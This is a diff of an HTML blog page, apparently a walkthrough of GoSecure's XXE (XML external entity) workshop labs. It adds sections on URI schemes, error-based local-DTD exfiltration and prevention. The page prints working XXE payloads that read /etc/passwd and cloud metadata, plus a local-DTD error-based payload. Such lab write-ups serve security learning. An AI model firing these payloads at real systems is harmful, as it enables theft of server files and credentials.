@@ -14,7 +14,7 @@
 <meta itemprop="name" content="Advanced XXE Labs (GoSecure)">
 <meta itemprop="description" content="GoSecure has released an amazing set of exercises, related to XXE (XML eXternal Entity) attacks.">
 
-<meta itemprop="wordCount" content="1364">
+<meta itemprop="wordCount" content="1539">
 <meta itemprop="keywords" content="xxe,dtd,oob,jar,gosecure," />
 
 <meta name="twitter:card" content="summary"/>
@@ -313,35 +313,85 @@ Many thanks to GoSecure for releasing this workshop to the public.</p>
 <li><a href="https://github.com/staaldraad/xxeserv">https://github.com/staaldraad/xxeserv</a></li>
 <li><code>python3 -m pyftpdlib -p 21</code></li>
 </ul>
+<p><img src="/xxe_workshop/exfiltrate_files_as_data_not_xml.png" alt=""></p>
 <h3 id="filter-encoding">Filter Encoding</h3>
 <p>XXE have major limitations regarding which file can be read. In general, you can&rsquo;t read non-ASCII characters or special characters that are not XML compatible.</p>
 <p>In order to read files with special characters, in PHP, we can leverage its filter encoding feature to encode file contents in base64 format.
 <code>php://filter/convert.base64-encode/resource=/etc/passwd</code></p>
-<h3 id="protocols">Protocols</h3>
+<h3 id="uri-schemes">URI Schemes</h3>
 <ul>
 <li><code>file://C:/Windows/System32/inetsrv/config/applicationHost.config</code></li>
 <li><code>http[s]://169.254.169.254/latest/user-data</code></li>
 <li><code>ftp://user:password@internal.company.net/file</code></li>
 <li><code>gopher://server/?data</code>
 <ul>
-<li>Another option for data exfiltration is the gopher protocol. It allows to connect to any server with a TCP with an arbitrary message. The path section of the URL is the data that will be written to the TCP socket. It is rarely available as it requires very old versions of Java</li>
+<li>Another option for data exfiltration is the gopher URI scheme. It allows to connect to any server with a TCP with an arbitrary message. The path section of the URL is the data that will be written to the TCP socket. It is rarely available as it requires very old versions of Java</li>
 </ul>
 </li>
 <li><code>jar:file://./archive.zip!config.properties</code>
 <ul>
-<li>The jar protocol is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (.zip, .jar, &hellip;).</li>
+<li>The jar scheme is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (.zip, .jar, &hellip;).</li>
 <li>It works for local and <strong>remote</strong> archives.</li>
 </ul>
 </li>
 <li><code>netdoc:///etc/passwd</code>
 <ul>
-<li>This protocol is alternative to the file:// protocol. It is of limited use. It is often cited as a method to bypass some WAF blocking.</li>
+<li>This URI scheme is an alternative to the file:// scheme. It is of limited use. It is often cited as a method to bypass some WAF blocking.</li>
 </ul>
 </li>
+<li><code>glob://</code></li>
 </ul>
-<p>More on <strong>JAR:FILE://</strong> protocol:</p>
+<p><img src="/xxe_workshop/protocols_per_language.png" alt=""></p>
+<p>More on <strong>JAR:FILE://</strong> URI scheme:</p>
 <p><img src="/xxe_workshop/jar_pseudo_protocol.png" alt=""></p>
 <p>When accessing remote archives, the file is downloaded temporarily in /tmp/ directory and the requested file is extracted. These files are removed when the connection is closed. We can control the duration of our connection being open using some custom modified web servers. Writing files in a temporary directory can help escalate another vulnerability that involves a path traversal (such as local file include, template injection, XSLT RCE, deserialization, etc).</p>
+<h3 id="local-dtd-oob-error-based-exfiltration">Local DTD (OOB Error Based Exfiltration)</h3>
+<p>The technique is described <a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">HERE</a> by Arseniy Sharoglazov. Its goal is to bypass the restrictions of external DTD requests dropped due to Firewalls/IDS, taking advantage of detailed error messages returned from the server.</p>
+<p><img src="/xxe_workshop/local_dtd_static_entity_injection.png" alt=""></p>
+<p><strong>Error based external DTD</strong></p>
+<p><img src="/xxe_workshop/error_based_external_dtd.png" alt=""></p>
+<p><strong>Error based internal DTD (XML injection)</strong>
+We need to find an entity that is declared and use in the same DTD.</p>
+<p><img src="/xxe_workshop/error_based_local_dtd.png" alt=""></p>
+<p>&ldquo;It works because all XML entities are constant. If you define two entities with the same name, only the first one will be used.&rdquo;</p>
+<pre><code>Other local DTD files: `find / -type f -iname &quot;*.dtd&quot; 2&gt;/dev/null`
+</code></pre>
+<p><img src="/xxe_workshop/local_dtd_static_entity_injection_2.png" alt=""></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE message [
+</span><span style="color:#999;font-weight:bold;font-style:italic">    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/xml/fontconfig/fonts.dtd&#34;&gt;</span>
+
+    <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % constant &#39;aaa)&gt;</span>
+        <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+        <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+        <span style="color:#800080">&amp;#x25;</span>eval;
+        <span style="color:#800080">&amp;#x25;</span>error;
+        <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ELEMENT aa (bb&#39;&gt;</span>
+
+    %local_dtd;
+]&gt;
+<span style="color:#000080">&lt;message&gt;&lt;/message&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="prevention">Prevention</h3>
+<p><img src="/xxe_workshop/prevention_steps.png" alt=""></p>
+<p><img src="/xxe_workshop/prevention_per_language.png" alt=""></p>
 <hr>
 <pre><code> In order to deploy the challenges:
     1. chmod +x ./gradlew   (if available)
@@ -352,7 +402,7 @@ Many thanks to GoSecure for releasing this workshop to the public.</p>
 <hr>
 <h3 id="lab-1-basic-xxe">Lab 1: Basic XXE</h3>
 <p><img src="/xxe_workshop/lab1_basic_xxe.png" alt=""></p>
-<p>By inspecting the XML data fetched from Wired Magazine:</p>
+<p>By inspecting the XML data fetched from Wired Magazine we alter it to deliver our payload:</p>
 <pre><code>&lt;!DOCTYPE X [ &lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
 &lt;item&gt;
     &lt;title&gt;XXE&lt;/title&gt;
@@ -805,7 +855,27 @@ log <span style="color:#000;font-weight:bold">=</span> <span style="color:#00808
     IOLoop<span style="color:#000;font-weight:bold">.</span>instance()<span style="color:#000;font-weight:bold">.</span>start()
 </code></pre></td></tr></table>
 </div>
-</div>
+</div><h3 id="resources">Resources</h3>
+<p><strong>Payloads</strong></p>
+<ul>
+<li><a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md</a></li>
+<li><a href="https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt">https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt</a></li>
+<li><a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads_jars.md">https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads_jars.md</a></li>
+<li><a href="https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files_jars.txt">https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files_jars.txt</a></li>
+</ul>
+<p><strong>Research</strong></p>
+<ul>
+<li><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></li>
+<li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></li>
+<li><a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></li>
+<li><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></li>
+<li><a href="https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf">https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf</a></li>
+<li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></li>
+<li><a href="https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi">https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi</a></li>
+<li><a href="https://owasp.org/www-pdf-archive/XXE_-_The_Anatomy_of_an_XML_Attack_-_Mike_Felch.pdf">https://owasp.org/www-pdf-archive/XXE_-_The_Anatomy_of_an_XML_Attack_-_Mike_Felch.pdf</a></li>
+<li><a href="https://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html">https://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html</a></li>
+</ul>
+
   </div>
 
   
